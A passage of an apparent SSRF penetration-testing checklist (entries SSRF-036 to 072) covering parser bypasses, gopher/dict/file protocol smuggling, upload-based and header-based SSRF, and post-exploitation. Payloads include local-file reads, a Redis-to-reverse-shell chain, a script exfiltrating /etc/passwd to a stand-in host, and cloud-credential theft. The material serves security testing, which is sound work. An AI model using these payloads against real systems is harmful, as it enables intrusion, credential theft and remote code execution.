**Impact:** Beats normalize-after-validate bugs.

**Tools:** Burp, Python unicodedata

**References:** CWE-918; Orange Tsai; PayloadsAllTheThings unicode

---

## SSRF-036 — URL parser differential (@ / # / ? confusion)
**Test Category:** Bypass — Parser Tricks · **Severity:** Critical · **CVSS:** 9.9 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:L)

**Where to Test / Injection Point:** Allowlist parsing host differently from the HTTP client

**Test Steps:** 1. Creds: http://allowed.com@127.0.0.1/.<br>2. Fragment: http://127.0.0.1#@allowed.com/ and http://allowed.com#127.0.0.1/.<br>3. Query: http://127.0.0.1?allowed.com.<br>4. Compare which side treats which token as host.

**Expected Result:** Validator reads allowed.com as host; client connects to 127.0.0.1.

**Payload Example:**

```
?url=http://allowed.com@127.0.0.1/
?url=http://127.0.0.1%23@allowed.com/
```

**Impact:** Breaks allowlists via parser inconsistency (urllib/Node/Java/Go/PHP).

**Tools:** Burp, curl, parser harness

**References:** CWE-918; Jira CVE-2019-8451 (@-bypass); Orange Tsai 'New Era of SSRF'; PortSwigger

---

## SSRF-037 — Backslash parser trick
**Test Category:** Bypass — Parser Tricks · **Severity:** High · **CVSS:** 7.7 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:L/A:L)

**Where to Test / Injection Point:** Parsers treating backslash inconsistently (Windows-ish)

**Test Steps:** 1. http://allowed.com\@127.0.0.1/.<br>2. http://allowed.com%5c@127.0.0.1/.<br>3. http:\\127.0.0.1\.<br>4. Test encoded + raw.

**Expected Result:** Backslash confuses validator vs client host parsing.

**Payload Example:**

```
?url=http://allowed.com\@127.0.0.1/
```

**Impact:** Bypass on stacks normalizing backslash to slash after validation.

**Tools:** Burp, curl

**References:** CWE-918; Orange Tsai SSRF; PayloadsAllTheThings

---

## SSRF-038 — file:// local file read
**Test Category:** Protocol Smuggling · **Severity:** High · **CVSS:** 8.6 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N)

**Where to Test / Injection Point:** Fetchers accepting arbitrary schemes

**Test Steps:** 1. /etc/passwd, /etc/hosts, /proc/self/environ, /proc/self/cmdline, /proc/net/tcp, /proc/net/arp.<br>2. Secrets: SA token, ~/.aws/credentials; source via /proc/self/cwd.<br>3. Windows: file:///c:/windows/win.ini.

**Expected Result:** Local file contents returned or exfiltrated OOB.

**Payload Example:**

```
?url=file:///etc/passwd
?url=file:///proc/self/environ
```

**Impact:** Discloses creds/tokens/source + internal net state (/proc/net/*).

**Tools:** Burp, curl

**References:** CWE-918; PayloadsAllTheThings LFI/SSRF; HackTricks

---

## SSRF-039 — gopher:// arbitrary TCP -&gt; internal RCE
**Test Category:** Protocol Smuggling · **Severity:** Critical · **CVSS:** 9.9 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)

**Where to Test / Injection Point:** SSRF where gopher:// accepted or reachable via redirect

**Test Steps:** 1. Confirm gopher hits your listener with raw bytes.<br>2. gopherus for Redis/MySQL/Postgres/FastCGI/SMTP.<br>3. Redis: write cron/module or SLAVEOF for RCE.<br>4. Encode CRLF precisely (%0d%0a).

**Expected Result:** Arbitrary bytes to internal TCP service -&gt; command execution.

**Payload Example:**

```
gopher://127.0.0.1:6379/_%2A1%0d%0a%248%0d%0aflushall%0d%0a  (then cron key -> RCE)
```

**Impact:** SSRF-to-RCE — highest-impact SSRF outcome.

**Tools:** gopherus, SSRFmap, Burp

**References:** CWE-918; Gopherus; PayloadsAllTheThings gopher; HackTricks Redis

---

## SSRF-040 — dict:// service interaction
**Test Category:** Protocol Smuggling · **Severity:** High · **CVSS:** 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** SSRF accepting dict scheme

**Test Steps:** 1. dict://127.0.0.1:6379/INFO to fingerprint Redis.<br>2. dict:// against other line protocols.<br>3. Use to confirm service before gopher RCE.

**Expected Result:** Service banner/data returned via dict scheme.

**Payload Example:**

```
?url=dict://127.0.0.1:6379/INFO
```

**Impact:** Internal service fingerprinting; stepping stone to gopher RCE.

**Tools:** Burp, curl, SSRFmap

**References:** CWE-918; PayloadsAllTheThings protocols; HackTricks

---

## SSRF-041 — ftp:// and ldap:// interaction
**Test Category:** Protocol Smuggling · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N)

**Where to Test / Injection Point:** SSRF accepting ftp/ldap schemes

**Test Steps:** 1. ftp://$COLLAB/ for OOB + banner.<br>2. ldap://127.0.0.1/%0astats%0aquit.<br>3. Use for internal daemons rejecting raw HTTP.

**Expected Result:** Interaction/banner from ftp/ldap daemons.

**Payload Example:**

```
?url=ftp://$COLLAB/
?url=ldap://127.0.0.1/%0astats%0aquit
```

**Impact:** Extends reach to non-HTTP internal services.

**Tools:** Burp, SSRFmap

**References:** CWE-918; PayloadsAllTheThings protocols

---

## SSRF-042 — Language wrappers: php:// jar:// netdoc: data:
**Test Category:** Protocol Smuggling · **Severity:** High · **CVSS:** 8.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** PHP/Java fetchers

**Test Steps:** 1. PHP: php://filter/convert.base64-encode/resource=/etc/passwd.<br>2. Java: jar:http://$ATTACKER/x.jar!/, netdoc:///etc/passwd.<br>3. data://text/plain;base64,....

**Expected Result:** Wrapper reads local files / triggers fetch per language.

**Payload Example:**

```
?url=php://filter/convert.base64-encode/resource=/etc/passwd
?url=jar:http://$ATTACKER/x.jar!/
```

**Impact:** Language-specific local read / SSRF beyond http(s).

**Tools:** Burp, custom fuzzing

**References:** CWE-918; Synacktiv PHP/Java; PayloadsAllTheThings

---

## SSRF-043 — Scheme-filter evasion (case/whitespace)
**Test Category:** Protocol Smuggling · **Severity:** High · **CVSS:** 8.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Scheme allowlists (http/https only)

**Test Steps:** 1. Case: FILE://, gOpHeR://.<br>2. Leading whitespace/tab/newline; URL-encode scheme %66%69%6c%65.<br>3. Retest file/gopher after bypass.

**Expected Result:** Disallowed scheme accepted after case/whitespace/encoding tricks.

**Payload Example:**

```
?url=FILE:///etc/passwd
?url=%66%69%6c%65:///etc/passwd
```

**Impact:** Reopens file/gopher against lowercase-only blocklists.

**Tools:** Burp, custom fuzzing

**References:** CWE-918; Orange Tsai SSRF; PayloadsAllTheThings

---

## SSRF-044 — SSRF via SVG upload
**Test Category:** File-Upload SSRF · **Severity:** High · **CVSS:** 7.7 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:L/A:L)

**Where to Test / Injection Point:** Image upload rasterizing SVG server-side

**Test Steps:** 1. Upload SVG with &lt;image href&gt; / &lt;use&gt; pointing at Collaborator.<br>2. Repoint to 127.0.0.1 / metadata.<br>3. Confirm fetch during thumbnailing.

**Expected Result:** Renderer dereferences SVG external reference to your target.

**Payload Example:**

```
<svg xmlns="http://www.w3.org/2000/svg"><image href="http://169.254.169.254/latest/meta-data/"/></svg>
```

**Impact:** Blind SSRF with no URL param; cloud creds on cloud hosts.

**Tools:** Burp, ImageMagick

**References:** CWE-918; PayloadsAllTheThings; HackTricks SVG

---

## SSRF-045 — SSRF via XXE in XML/Office upload
**Test Category:** File-Upload SSRF · **Severity:** High · **CVSS:** 7.7 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:L/A:L)

**Where to Test / Injection Point:** XML, DOCX/XLSX/PPTX, SAML, SVG parsers

**Test Steps:** 1. Inject external entity to internal URL.<br>2. For OOXML unzip -&gt; edit XML part -&gt; re-zip -&gt; upload.<br>3. OOB entity to confirm; escalate to metadata/file read.

**Expected Result:** Parser resolves external entity -&gt; server-side request/file read.

**Payload Example:**

```
<!DOCTYPE r [<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/">]><r>&x;</r>
```

**Impact:** XXE-driven SSRF: internal fetch, cloud creds, or LFI.

**Tools:** Burp, XXEinjector, oxml editors

**References:** CWE-918; PortSwigger XXE-SSRF; PayloadsAllTheThings XXE

---

## SSRF-046 — SSRF via HTML-to-PDF / headless renderer
**Test Category:** File-Upload SSRF · **Severity:** Critical · **CVSS:** 9.9 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:L)

**Where to Test / Injection Point:** Invoice/report gen (wkhtmltopdf, headless Chrome, Puppeteer)

**Test Steps:** 1. Inject HTML loading internal resources (iframe/img/link src).<br>2. JS fetch metadata and embed into rendered PDF for exfil.<br>3. Try file:// src for LFI into the PDF.

**Expected Result:** Renderer fetches internal URLs; content appears in PDF/OOB.

**Payload Example:**

```
<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/"></iframe>
<script>fetch('file:///etc/passwd').then(r=>r.text()).then(t=>location='https://$COLLAB/?'+btoa(t))</script>
```

**Impact:** Reads/exfiltrates internal+cloud data through the doc pipeline.

**Tools:** Burp, wkhtmltopdf, Puppeteer

**References:** CWE-918; Assetnote PDF/headless SSRF; HackTricks

---

## SSRF-047 — SSRF via media transcoding (FFmpeg HLS / AVI)
**Test Category:** File-Upload SSRF · **Severity:** High · **CVSS:** 7.7 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:L/A:L)

**Where to Test / Injection Point:** Video/audio upload with server-side transcoding (FFmpeg/libav)

**Test Steps:** 1. Upload a crafted playlist/container referencing an external/internal URL.<br>2. HLS m3u8 with an #EXTINF segment pointing at http://169.254.169.254/... ; or the AVI GAB2 subtitle trick; or ffconcat.<br>3. FFmpeg dereferences the URL during transcoding - confirm OOB, then aim metadata/internal.<br>4. Some variants read the fetched bytes back into the output (in-band exfil).

**Expected Result:** The transcoder fetches the referenced internal/OOB URL during processing.

**Payload Example:**

```
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
http://169.254.169.254/latest/meta-data/iam/security-credentials/
#EXT-X-ENDLIST
```

**Impact:** Blind (sometimes in-band) SSRF via the media pipeline; on cloud hosts escalates to credential theft.

**Tools:** Burp, ffmpeg, custom playlist generators

**References:** CWE-918; FFmpeg HLS/AVI SSRF (video-based SSRF research); PayloadsAllTheThings/SSRF

---

## SSRF-048 — SSRF via ImageMagick (ImageTragick)
**Test Category:** File-Upload SSRF · **Severity:** Critical · **CVSS:** 9.0 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H)

**Where to Test / Injection Point:** Image processing on vulnerable ImageMagick/GraphicsMagick

**Test Steps:** 1. Upload MVG/SVG using fill 'url(...)' to fetch internal.<br>2. Test ImageTragick (CVE-2016-3714) for SSRF + possible RCE.<br>3. Confirm OOB then aim metadata.

**Expected Result:** Converter dereferences embedded URL (or executes).

**Payload Example:**

```
push graphic-context
viewbox 0 0 1 1
fill 'url(http://169.254.169.254/latest/meta-data/)'
pop graphic-context
```

**Impact:** SSRF and, on vulnerable versions, RCE via image pipeline.

**Tools:** Burp, ImageMagick, PoCs

**References:** CWE-918; ImageTragick CVE-2016-3714; PayloadsAllTheThings

---

## SSRF-049 — SSRF via DOCX/XLSX external references
**Test Category:** File-Upload SSRF · **Severity:** High · **CVSS:** 7.7 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:L/A:L)

**Where to Test / Injection Point:** Office-doc importers/converters (LibreOffice)

**Test Steps:** 1. Craft XLSX with external cell/data connection or DOCX with remote template/altChunk.<br>2. Point at Collaborator; upload/convert; confirm fetch.<br>3. Escalate to internal/metadata.

**Expected Result:** Office parser fetches the external reference server-side.

**Payload Example:**

```
xl/externalLinks/externalLink1.xml -> target http://169.254.169.254/latest/meta-data/
```

**Impact:** Blind SSRF via trusted document import; often metadata reach.

**Tools:** Burp, oxml tooling

**References:** CWE-918; PayloadsAllTheThings; office-doc SSRF writeups

---

## SSRF-050 — SSRF via rich-text/Markdown/HTML content
**Test Category:** File-Upload SSRF · **Severity:** Medium · **CVSS:** 6.3 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L)

**Where to Test / Injection Point:** WYSIWYG/Markdown that fetches remote images/embeds server-side

**Test Steps:** 1. Insert remote image/embed pointing at Collaborator.<br>2. If server fetches for proxy/cache/preview, repoint internal/metadata.<br>3. Check email/notification renderers too.

**Expected Result:** Content renderer fetches remote/internal resource server-side.

**Payload Example:**

```
![x](http://169.254.169.254/latest/meta-data/)
<img src="http://127.0.0.1:8080/actuator/env">
```

**Impact:** SSRF via everyday content features; frequently blind to metadata.

**Tools:** Burp, Collaborator

**References:** CWE-918; PayloadsAllTheThings; HackTricks

---

## SSRF-051 — SSRF via webhook/callback configuration
**Test Category:** Feature-Specific SSRF · **Severity:** High · **CVSS:** 7.7 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:L/A:L)

**Where to Test / Injection Point:** Webhook, IPN, CI trigger, OAuth callback config

**Test Steps:** 1. Set callback to Collaborator; trigger; confirm OOB.<br>2. Repoint 127.0.0.1 / 169.254.169.254 / internal.<br>3. Note async delays + retries.

**Expected Result:** Server callback reaches OOB then internal/metadata.

**Payload Example:**

```
webhook_url=https://$COLLAB/wh -> http://169.254.169.254/latest/meta-data/
```

**Impact:** Blind SSRF to metadata from a legit feature.

**Tools:** Burp Collaborator, interactsh

**References:** CWE-918; PayloadsAllTheThings; HackerOne webhook reports

---

## SSRF-052 — SSRF via URL preview / link unfurling
**Test Category:** Feature-Specific SSRF · **Severity:** High · **CVSS:** 8.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Chat/social link previews, OpenGraph fetchers

**Test Steps:** 1. Paste Collaborator link; confirm fetch.<br>2. Swap internal/metadata; inspect preview card for leaked content.<br>3. Chain redirect vs allowlist.

**Expected Result:** Unfurler fetches attacker URL; may render internal data in preview.

**Payload Example:**

```
message: https://$COLLAB/unfurl  then  http://169.254.169.254/latest/meta-data/
```

**Impact:** In-band SSRF reflecting internal content — classic chat bug.

**Tools:** Burp, Collaborator

**References:** CWE-918; PortSwigger SSRF; disclosed unfurl writeups

---

## SSRF-053 — SSRF via RSS/Atom feed reader
**Test Category:** Feature-Specific SSRF · **Severity:** High · **CVSS:** 7.7 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:L/A:L)

**Where to Test / Injection Point:** Feed readers / 'add feed by URL'

**Test Steps:** 1. Add Collaborator feed URL; confirm fetch.<br>2. Point internal/metadata; check if items reflect internal response.<br>3. Try file:// if permissive.

**Expected Result:** Feed fetcher retrieves arbitrary URLs; internal content may surface.

**Payload Example:**

```
feed_url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Impact:** In-band internal/cloud disclosure via trusted import.

**Tools:** Burp, Collaborator

**References:** CWE-918; PayloadsAllTheThings; WSTG-INPV-19

---

## SSRF-054 — SSRF via email functionality
**Test Category:** Feature-Specific SSRF · **Severity:** Medium · **CVSS:** 6.3 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L)

**Where to Test / Injection Point:** Remote images in email, 'send test email', SMTP callbacks

**Test Steps:** 1. Insert remote image/link; check if server fetches on send/preview.<br>2. Point internal/metadata.<br>3. Also test SMTP-side SSRF via mail relay config.

**Expected Result:** Mail pipeline fetches remote/internal resource server-side.

**Payload Example:**

```
<img src="http://169.254.169.254/latest/meta-data/"> in email body/template
```

**Impact:** Blind SSRF via mail rendering; metadata reach on cloud.

**Tools:** Burp, Collaborator

**References:** CWE-918; PayloadsAllTheThings; HackTricks

---

## SSRF-055 — SSRF via OAuth/OIDC &amp; SAML endpoint config
**Test Category:** Feature-Specific SSRF · **Severity:** High · **CVSS:** 7.7 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:L/A:L)

**Where to Test / Injection Point:** JWKS/OIDC discovery URL, SAML metadata/ACS URL

**Test Steps:** 1. Set jwks_uri/issuer/SAML metadata URL to Collaborator; confirm fetch.<br>2. Point internal discovery/metadata.<br>3. Test request-object/logout fetchers.

**Expected Result:** Server fetches attacker identity endpoints -&gt; internal/metadata.

**Payload Example:**

```
jwks_uri=https://$COLLAB/jwks -> http://169.254.169.254/latest/meta-data/
```

**Impact:** Server-to-server SSRF from identity plumbing; broad reach.

**Tools:** Burp, jwt_tool, SAML Raider

**References:** CWE-918; Bishop Fox OAuth/SAML; PayloadsAllTheThings

---

## SSRF-056 — SSRF via GraphQL URL arguments
**Test Category:** Feature-Specific SSRF · **Severity:** High · **CVSS:** 7.7 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:L/A:L)

**Where to Test / Injection Point:** GraphQL fields/mutations taking URLs

**Test Steps:** 1. Find fields/mutations with URL args.<br>2. Set Collaborator; confirm; pivot internal/metadata.<br>3. Batch/alias to scan multiple internal targets fast.

**Expected Result:** Server dereferences the URL argument to your target.

**Payload Example:**

```
mutation{ testWebhook(url:"http://169.254.169.254/latest/meta-data/"){status} }
```

**Impact:** SSRF via API; batching enables rapid internal scan.

**Tools:** Burp, InQL

**References:** CWE-918; Bishop Fox GraphQL; PayloadsAllTheThings

---

## SSRF-057 — SSRF via 'test connection' / integration config
**Test Category:** Feature-Specific SSRF · **Severity:** High · **CVSS:** 7.7 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:L/A:L)

**Where to Test / Injection Point:** DB/SMTP/storage integration setup with host:port

**Test Steps:** 1. Point integration host:port at Collaborator; confirm fetch.<br>2. Use arbitrary host:port for internal port scan.<br>3. dict/gopher via the connector where allowed.

**Expected Result:** Connector connects to attacker/internal host:port.

**Payload Example:**

```
db_host=127.0.0.1 db_port=6379  (or storage_endpoint=https://$COLLAB/)
```

**Impact:** Admin-side SSRF; internal scanning + service interaction.

**Tools:** Burp, SSRFmap

**References:** CWE-918; PayloadsAllTheThings; HackTricks

---

## SSRF-058 — SSRF via screenshot / webpage-capture service
**Test Category:** Feature-Specific SSRF · **Severity:** Critical · **CVSS:** 9.9 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:L)

**Where to Test / Injection Point:** 'Capture this URL' thumbnails (headless browser)

**Test Steps:** 1. Submit Collaborator URL; confirm headless fetch.<br>2. Capture internal pages/metadata; screenshot leaks their content.<br>3. Host HTML that fetch()es metadata and prints it.

**Expected Result:** Service renders internal pages and returns them as an image.

**Payload Example:**

```
?url=http://169.254.169.254/latest/meta-data/  (or JS-fetch page)
```

**Impact:** Visual data exfil; JS fetch escalates to IMDS creds.

**Tools:** Burp, headless harness

**References:** CWE-918; Grafana CVE-2020-13379 (avatar/img proxy); Assetnote headless SSRF

---

## SSRF-059 — SSRF via URL validator / shortener / health-check
**Test Category:** Feature-Specific SSRF · **Severity:** Medium · **CVSS:** 6.3 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L)

**Where to Test / Injection Point:** 'Is this URL up?', link shorteners, uptime checks

**Test Steps:** 1. Submit Collaborator; confirm fetch.<br>2. Point internal; read up/down + latency as oracle.<br>3. Follow-redirect to bypass allowlists.

**Expected Result:** Validator fetches arbitrary URLs; up/down leaks internal reachability.

**Payload Example:**

```
?url=http://$INT_IP:8080/  (observe status/latency)
```

**Impact:** Internal reachability oracle via a benign-looking utility.

**Tools:** Burp, Collaborator

**References:** CWE-918; PayloadsAllTheThings; WSTG-INPV-19

---

## SSRF-060 — SSRF via map/geolocation/proxy service
**Test Category:** Feature-Specific SSRF · **Severity:** Medium · **CVSS:** 6.3 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L)

**Where to Test / Injection Point:** Server-side geocoding, tile/proxy fetchers

**Test Steps:** 1. Find server-side geo/proxy fetches taking a URL/coords-&gt;URL.<br>2. Point at Collaborator; confirm; pivot internal.<br>3. Check tile/proxy caching for reflected content.

**Expected Result:** Geo/proxy backend fetches attacker/internal URL.

**Payload Example:**

```
?tile_url=http://169.254.169.254/latest/meta-data/
```

**Impact:** SSRF via mapping backends; metadata reach on cloud.

**Tools:** Burp, Collaborator

**References:** CWE-918; PayloadsAllTheThings; HackTricks

---

## SSRF-061 — SSRF via Server-Side Includes / XSLT processing
**Test Category:** Feature-Specific SSRF · **Severity:** High · **CVSS:** 7.7 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:L/A:L)

**Where to Test / Injection Point:** SSI-enabled pages; XSLT transformers

**Test Steps:** 1. SSI: &lt;!--#include virtual="http://169.254.169.254/..." --&gt;.<br>2. XSLT: document('http://169.254.169.254/...') / external stylesheet.<br>3. Confirm server fetches during processing.

**Expected Result:** SSI/XSLT engine dereferences the external URL.

**Payload Example:**

```
<!--#include virtual="http://169.254.169.254/latest/meta-data/" -->
<xsl:value-of select="document('http://$COLLAB/')"/>
```

**Impact:** SSRF via templating/transform engines; can chain to file read/RCE.

**Tools:** Burp, xsltproc

**References:** CWE-918; PayloadsAllTheThings; HackTricks XSLT/SSI

---

## SSRF-062 — SSRF via Host header
**Test Category:** Header-Based SSRF · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N)

**Where to Test / Injection Point:** Reverse-proxied apps using Host for routing/link building

**Test Steps:** 1. Set Host to Collaborator; look for OOB / poisoned links.<br>2. Where app fetches by Host (SSO, reset-link fetch, cache), point internal.<br>3. Combine with routing to reach internal vhosts.

**Expected Result:** App builds/fetches a URL from attacker Host header.

**Payload Example:**

```
GET / HTTP/1.1
Host: 169.254.169.254
```

**Impact:** Header SSRF bypassing body validation; enables reset-poisoning chains.

**Tools:** Burp, Param Miner

**References:** CWE-918; PortSwigger Host header attacks; Orange Tsai

---

## SSRF-063 — SSRF via X-Forwarded-Host / Forwarded
**Test Category:** Header-Based SSRF · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N)

**Where to Test / Injection Point:** Apps trusting XFH/Forwarded for absolute URLs

**Test Steps:** 1. Set X-Forwarded-Host/Forwarded to Collaborator; check link/asset generation + fetch.<br>2. Point internal where used server-side.<br>3. Pair with cache poisoning for persistence.

**Expected Result:** App uses forwarded host to build/fetch URLs to your target.

**Payload Example:**

```
X-Forwarded-Host: $COLLAB
Forwarded: host=169.254.169.254
```

**Impact:** Header SSRF + cache-poisoning amplification.

**Tools:** Burp, Param Miner

**References:** CWE-918; PortSwigger cache poisoning; Orange Tsai

---

## SSRF-064 — SSRF via Referer &amp; custom forwarding headers
**Test Category:** Header-Based SSRF · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N)

**Where to Test / Injection Point:** Analytics/preview fetching Referer; X-Original-URL/X-Rewrite-URL

**Test Steps:** 1. Set Referer to Collaborator; confirm server-side fetch.<br>2. Fuzz X-Original-URL/X-Rewrite-URL/X-Custom-IP-Authorization for internal routing.<br>3. Pivot confirmed vectors internal/metadata.

**Expected Result:** Server fetches Referer/forwarding-header value to attacker host.

**Payload Example:**

```
Referer: http://169.254.169.254/latest/meta-data/
X-Original-URL: /admin
```

**Impact:** Header-driven SSRF + internal routing param filters miss.

**Tools:** Burp, Param Miner

**References:** CWE-918; PortSwigger; PayloadsAllTheThings

---

## SSRF-065 — SSRF quirks — PHP
**Test Category:** Tech-Specific SSRF · **Severity:** High · **CVSS:** 7.1 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** PHP fetchers (curl/file_get_contents/parse_url)

**Test Steps:** 1. parse_url vs curl host mismatch; php:// wrappers; SplFileObject.<br>2. file_get_contents follows http-&gt;file where allow_url_fopen on.<br>3. Test 0-prefixed/parser edge cases.

**Expected Result:** PHP-specific wrapper/parser quirks unlock bypass/LFI.

**Payload Example:**

```
?url=php://filter/convert.base64-encode/resource=/etc/passwd
```

**Impact:** Targeted PHP payloads raise success on hardened PHP apps.

**Tools:** Burp, SonarSource writeups

**References:** CWE-918; SonarSource PHP; Orange Tsai

---

## SSRF-066 — SSRF quirks — Java
**Test Category:** Tech-Specific SSRF · **Severity:** High · **CVSS:** 7.1 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Java fetchers (java.net.URL/HttpURLConnection)

**Test Steps:** 1. Backslash/# handling; jar:, netdoc: schemes; DNS pinning gaps.<br>2. URL vs URI parsing differences.<br>3. Follow-redirect defaults.

**Expected Result:** Java parser/scheme quirks enable bypass + local read.

**Payload Example:**

```
?url=jar:http://$ATTACKER/x.jar!/
?url=netdoc:///etc/passwd
```

**Impact:** Java-tuned payloads defeat allowlists on JVM apps.

**Tools:** Burp, Synacktiv writeups

**References:** CWE-918; Synacktiv Java; Orange Tsai

---

## SSRF-067 — SSRF quirks — Node.js
**Test Category:** Tech-Specific SSRF · **Severity:** High · **CVSS:** 7.1 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Node fetchers (url.parse vs WHATWG URL)

**Test Steps:** 1. url.parse vs new URL host differences; unicode host handling.<br>2. Follow-redirect libs (axios/node-fetch/request).<br>3. IPv6/decimal acceptance.

**Expected Result:** Node parser differences unlock @/#/unicode bypasses.

**Payload Example:**

```
?url=http://allowed.com@127.0.0.1/  (url.parse vs WHATWG)
```

**Impact:** Node-specific payloads bypass JS allowlists.

**Tools:** Burp, Node REPL

**References:** CWE-918; Orange Tsai; Node URL docs

---

## SSRF-068 — SSRF quirks — Python
**Test Category:** Tech-Specific SSRF · **Severity:** High · **CVSS:** 7.1 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Python fetchers (urllib/requests)

**Test Steps:** 1. urllib accepts decimal/octal IPs; requests follows redirects by default.<br>2. IPv6/mapped acceptance; unicode host.<br>3. Session-level redirect settings.

**Expected Result:** Python parser leniency (decimal/octal, redirects) enables bypass.

**Payload Example:**

```
?url=http://2130706433/  (urllib accepts integer host)
```

**Impact:** Python-tuned payloads bypass filters on Django/Flask apps.

**Tools:** Burp, Python REPL

**References:** CWE-918; PayloadsAllTheThings; PortSwigger

---

## SSRF-069 — SSRF quirks — Ruby / Go
**Test Category:** Tech-Specific SSRF · **Severity:** High · **CVSS:** 7.1 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Ruby (open-uri/Net::HTTP) and Go (net/http) fetchers

**Test Steps:** 1. Ruby open-uri pipe/command quirks (legacy); Net::HTTP redirects.<br>2. Go net/http strict-but-quirky parsing; test @/# and IPv6.<br>3. Follow-redirect defaults per lib.

**Expected Result:** Ruby/Go parser edge cases enable bypass or command-ish behaviour.

**Payload Example:**

```
Ruby open('|command') legacy; Go: ?url=http://allowed.com@127.0.0.1/
```

**Impact:** Stack-matched payloads improve exploit rate on Ruby/Go apps.

**Tools:** Burp, language REPLs

**References:** CWE-918; Synacktiv; PayloadsAllTheThings

---

## SSRF-070 — Post-ex: internal admin panels &amp; Spring actuator
**Test Category:** Post-Exploitation · **Severity:** High · **CVSS:** 8.4 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:L)

**Where to Test / Injection Point:** Confirmed SSRF with internal HTTP reach

**Test Steps:** 1. Hit Jenkins/Grafana/Kibana/Consul/admin UIs.<br>2. Spring /actuator/env, /heapdump for secrets.<br>3. Trigger state-changing GET actions where present.

**Expected Result:** Internal management UIs leak config/secrets or allow actions.

**Payload Example:**

```
?url=http://127.0.0.1:8080/actuator/env
?url=http://127.0.0.1:8080/actuator/heapdump
```

**Impact:** Escalates SSRF to secret disclosure / internal admin control.

**Tools:** Burp, SSRFmap

**References:** CWE-918; Spring actuator abuse; HackTricks

---

## SSRF-071 — Post-ex: internal Redis / DB / cache abuse
**Test Category:** Post-Exploitation · **Severity:** Critical · **CVSS:** 9.9 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)

**Where to Test / Injection Point:** Internal Redis/Memcached/MySQL/Postgres reachable

**Test Steps:** 1. Fingerprint via dict INFO.<br>2. gopher Redis set cron/module/SLAVEOF -&gt; RCE, or dump keys.<br>3. Memcached read/poison sessions.

**Expected Result:** Data read/modified or RCE on the datastore.

**Payload Example:**

```
gopher://127.0.0.1:6379/_ ... set cron -> reverse shell
```

**Impact:** SSRF-to-RCE and mass data compromise — top-tier impact.

**Tools:** gopherus, SSRFmap, redis-cli

**References:** CWE-918; HackTricks Redis; Gopherus

---

## SSRF-072 — Post-ex: cloud credential abuse &amp; blast-radius
**Test Category:** Post-Exploitation · **Severity:** Critical · **CVSS:** 9.9 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)

**Where to Test / Injection Point:** IAM/SA/managed-identity token from metadata SSRF

**Test Steps:** 1. Load creds into provider CLI; run identity check.<br>2. Enumerate resources read-only (S3, secrets, KMS).<br>3. Capture proof; avoid destructive actions.

**Expected Result:** Stolen token authenticates to cloud API and lists resources.

**Payload Example:**

```
aws sts get-caller-identity ; aws s3 ls ; aws secretsmanager list-secrets
```

**Impact:** Quantifies cloud blast radius — 'SSRF' vs 'account takeover'.

**Tools:** aws-cli, gcloud, az, Pacu, ScoutSuite

**References:** CWE-918; Sam Curry writeups; Rhino Pacu

---

